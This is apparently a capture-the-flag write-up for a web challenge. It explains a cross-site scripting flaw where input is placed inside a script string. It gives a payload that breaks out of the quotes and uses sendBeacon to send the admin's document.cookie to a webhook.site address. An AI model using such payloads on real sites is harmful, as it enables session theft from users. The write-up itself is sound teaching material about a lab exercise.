# Write-up: i-see-no-vulnerability

## Category: web

## Author tomek7667

Get yourself a webhook site. You can use [webhook.site](https://webhook.site/).

My webhook: `https://webhook.site/#!/124ee02c-b0c7-4c9b-ba48-a5a99f002679/`

After inspection on the files, we can see that it's a clearly a XSS challenge, and we need to report a site to an admin to get the flag which is stored in a cookie. There is sanitization used, however we can inject our payload in the `<script>` tag where the logic for displaying the GIF is implemented:

Before:

```html
<script>
	const text = "{{Our input}}";
	if (text.length === 0) {
		vision.innerHTML = "<img src='/i-see-nothing.gif' />";
	}
</script>
```

So when creating the payload we just need to escape the quotes to make the JS still execute. Example payload that escapes the quotes and sends the cookie to our webhook:

```
"; navigator.sendBeacon("https://webhook.site/124ee02c-b0c7-4c9b-ba48-a5a99f002679", document.cookie); "
```

After:

```html
<script>
	const text = "";
	navigator.sendBeacon(
		"https://webhook site/124ee02c-b0c7-4c9b-ba48-a5a99f002679",
		document.cookie
	);
	("");
	if (text.length === 0) {
		vision.innerHTML = "<img src='/i-see-nothing.gif' />";
	}
</script>
```

The only thing to do is to now create an image with the payload inside. As this is only JS code, and not HTML, the XSS sanitizer will assume the user input is valid, even though it's not, and that's why it's not going to sanitize it.

Creating the actual image with the payload inside might be a little bit tricky, but as the challenge is easily locally deployable, the rate-limit for trial and error shouldn't be a problem. For me, the solving image is:

![Solving image](solution.png)

https://webhook.site/#!/735b11b1-9924-4b89-b967-7db73a9df3d2/19a6b97e-eef9-4359-8c71-32c36a5f6736/1


https://github.com/daffainfo/ctf-writeup/blob/main/pingCTF%202023/i-see-no-vulnerability


